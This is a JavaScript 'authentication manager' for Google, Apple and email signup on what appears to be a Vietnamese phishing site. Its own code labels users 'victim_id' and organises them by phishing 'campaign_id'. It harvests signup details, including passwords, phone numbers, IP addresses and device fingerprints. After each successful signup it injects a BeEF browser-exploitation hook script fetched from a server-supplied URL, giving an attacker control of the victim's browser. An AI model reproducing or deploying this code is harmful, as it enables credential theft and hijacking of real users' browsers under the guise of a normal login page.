/**
 * Authentication JavaScript
 * Handles OAuth flows and authentication processes
 */

class AuthManager {
    constructor() {
        this.currentUser = null;
        this.campaignId = null;
        this.deviceFingerprint = null;
    }

    /**
     * Initialize authentication manager
     */
    async init() {
        this.campaignId = this.getCampaignId();
        this.deviceFingerprint = await this.getDeviceFingerprint();
        
        // Check for existing session
        await this.checkExistingSession();
    }

    /**
     * Get campaign ID from URL or localStorage
     */
    getCampaignId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('campaign_id') || 
               urlParams.get('utm_campaign') || 
               localStorage.getItem('campaign_id') || 
               'default';
    }

    /**
     * Get device fingerprint
     */
    async getDeviceFingerprint() {
        if (typeof getDeviceFingerprint === 'function') {
            return await getDeviceFingerprint();
        }
        return localStorage.getItem('device_fingerprint') || 'unknown';
    }

    /**
     * Check for existing session
     */
    async checkExistingSession() {
        const sessionData = localStorage.getItem('user_session');
        if (sessionData) {
            try {
                this.currentUser = JSON.parse(sessionData);
                return true;
            } catch (error) {
                console.error('Error parsing session data:', error);
                localStorage.removeItem('user_session');
            }
        }
        return false;
    }

    /**
     * Handle OAuth signup with Google
     */
    async signupWithGoogle() {
        try {
            // Track OAuth attempt
            this.trackEvent('oauth_signup_attempt', {
                provider: 'google',
                page: window.location.pathname,
                campaign_id: this.campaignId
            });

            // Get OAuth URL
            const redirectUri = encodeURIComponent(window.location.origin + '/google_auth.html');
            const authUrl = `/api/oauth/google/authorize?redirect_uri=${redirectUri}&campaign_id=${this.campaignId}`;
            
            // Redirect to Google OAuth
            window.location.href = authUrl;
        } catch (error) {
            console.error('Google OAuth error:', error);
            this.showError('Có lỗi xảy ra khi đăng ký với Google');
        }
    }

    /**
     * Handle OAuth signup with Apple
     */
    async signupWithApple() {
        try {
            // Track OAuth attempt
            this.trackEvent('oauth_signup_attempt', {
                provider: 'apple',
                page: window.location.pathname,
                campaign_id: this.campaignId
            });

            // Get OAuth URL
            const redirectUri = encodeURIComponent(window.location.origin + '/apple_auth.html');
            const authUrl = `/api/oauth/apple/authorize?redirect_uri=${redirectUri}&campaign_id=${this.campaignId}`;
            
            // Redirect to Apple OAuth
            window.location.href = authUrl;
        } catch (error) {
            console.error('Apple OAuth error:', error);
            this.showError('Có lỗi xảy ra khi đăng ký với Apple');
        }
    }

    /**
     * Process OAuth callback
     */
    async processOAuthCallback(provider) {
        try {
            // Get URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const error = urlParams.get('error');
            
            if (error) {
                throw new Error(`OAuth error: ${error}`);
            }
            
            if (!code) {
                throw new Error('No authorization code received');
            }

            // Get client IP
            const clientIP = await this.getClientIP();

            // Send OAuth data to backend
            const response = await fetch(`/api/oauth/${provider}/callback`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    code: code,
                    device_fingerprint: this.deviceFingerprint,
                    campaign_id: this.campaignId,
                    client_ip: clientIP,
                    user_agent: navigator.userAgent,
                    referrer: document.referrer
                })
            });

            const result = await response.json();

            if (response.ok && result.success) {
                // Store user session
                this.currentUser = result.data;
                localStorage.setItem('user_session', JSON.stringify(this.currentUser));
                
                // Track successful signup
                this.trackEvent('oauth_signup_success', {
                    provider: provider,
                    user_id: this.currentUser.victim_id,
                    campaign_id: this.campaignId
                });

                // Inject BeEF hook if provided
                if (result.beef_hook_url) {
                    this.injectBeEFHook(result.beef_hook_url);
                }

                return result.data;
            } else {
                throw new Error(result.message || 'OAuth callback failed');
            }
        } catch (error) {
            console.error('OAuth callback error:', error);
            this.trackEvent('oauth_signup_error', {
                provider: provider,
                error: error.message,
                campaign_id: this.campaignId
            });
            throw error;
        }
    }

    /**
     * Handle email signup
     */
    async signupWithEmail(formData) {
        try {
            // Validate form data
            this.validateEmailForm(formData);

            // Get client IP
            const clientIP = await this.getClientIP();

            // Prepare signup data
            const signupData = {
                ...formData,
                device_fingerprint: this.deviceFingerprint,
                campaign_id: this.campaignId,
                client_ip: clientIP,
                user_agent: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };

            // Track signup attempt
            this.trackEvent('email_signup_attempt', {
                email: formData.email,
                campaign_id: this.campaignId
            });

            // Send signup request
            const response = await fetch('/api/auth/signup', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(signupData)
            });

            const result = await response.json();

            if (response.ok && result.success) {
                // Store user session
                this.currentUser = result.data;
                localStorage.setItem('user_session', JSON.stringify(this.currentUser));
                
                // Track successful signup
                this.trackEvent('email_signup_success', {
                    user_id: this.currentUser.victim_id,
                    campaign_id: this.campaignId
                });

                // Inject BeEF hook if provided
                if (result.beef_hook_url) {
                    this.injectBeEFHook(result.beef_hook_url);
                }

                return result.data;
            } else {
                throw new Error(result.message || 'Email signup failed');
            }
        } catch (error) {
            console.error('Email signup error:', error);
            this.trackEvent('email_signup_error', {
                error: error.message,
                campaign_id: this.campaignId
            });
            throw error;
        }
    }

    /**
     * Validate email signup form
     */
    validateEmailForm(formData) {
        const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'company', 'password', 'confirmPassword'];
        
        for (const field of requiredFields) {
            if (!formData[field] || formData[field].trim() === '') {
                throw new Error(`Vui lòng điền đầy đủ thông tin ${field}`);
            }
        }

        // Validate email
        if (!this.validateEmail(formData.email)) {
            throw new Error('Email không hợp lệ');
        }

        // Validate phone
        if (!this.validatePhone(formData.phone)) {
            throw new Error('Số điện thoại không hợp lệ');
        }

        // Validate password
        if (formData.password.length < 8) {
            throw new Error('Mật khẩu phải có ít nhất 8 ký tự');
        }

        // Validate password confirmation
        if (formData.password !== formData.confirmPassword) {
            throw new Error('Mật khẩu xác nhận không khớp');
        }
    }

    /**
     * Validate email format
     */
    validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    /**
     * Validate phone number (Vietnamese format)
     */
    validatePhone(phone) {
        const re = /^(\+84|84|0)[1-9][0-9]{8,9}$/;
        return re.test(phone.replace(/\s/g, ''));
    }

    /**
     * Get client IP address
     */
    async getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting client IP:', error);
            return 'unknown';
        }
    }

    /**
     * Inject BeEF hook
     */
    injectBeEFHook(hookUrl) {
        try {
            // Create and inject BeEF hook script
            const script = document.createElement('script');
            script.src = hookUrl;
            script.async = true;
            script.onload = function() {
                console.log('BeEF hook loaded successfully');
            };
            script.onerror = function() {
                console.error('Failed to load BeEF hook');
            };
            document.head.appendChild(script);
            
            console.log('BeEF hook injected:', hookUrl);
            
            // Track BeEF injection
            this.trackEvent('beef_hook_injected', {
                hook_url: hookUrl,
                user_id: this.currentUser?.victim_id,
                campaign_id: this.campaignId
            });
        } catch (error) {
            console.error('Failed to inject BeEF hook:', error);
        }
    }

    /**
     * Track events
     */
    trackEvent(eventName, eventData) {
        const event = {
            name: eventName,
            data: {
                ...eventData,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                referrer: document.referrer,
                url: window.location.href
            }
        };

        // Send to analytics endpoint
        fetch('/api/analytics/track', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(event)
        }).catch(error => {
            console.error('Analytics tracking error:', error);
        });

        // Log to console in development
        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
            console.log('Event tracked:', event);
        }
    }

    /**
     * Show success message
     */
    showSuccess(message) {
        this.showNotification(message, 'success');
    }

    /**
     * Show error message
     */
    showError(message) {
        this.showNotification(message, 'error');
    }

    /**
     * Show notification
     */
    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
        notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
        notification.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        document.body.appendChild(notification);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    /**
     * Logout user
     */
    logout() {
        this.currentUser = null;
        localStorage.removeItem('user_session');
        
        // Track logout
        this.trackEvent('user_logout', {
            campaign_id: this.campaignId
        });
        
        // Redirect to home page
        window.location.href = '/';
    }

    /**
     * Get current user
     */
    getCurrentUser() {
        return this.currentUser;
    }

    /**
     * Check if user is authenticated
     */
    isAuthenticated() {
        return this.currentUser !== null;
    }
}

// Global auth manager instance
const authManager = new AuthManager();

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    authManager.init();
});

// Global functions for OAuth signup
function signupWithGoogle() {
    authManager.signupWithGoogle();
}

function signupWithApple() {
    authManager.signupWithApple();
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { AuthManager, authManager };
}
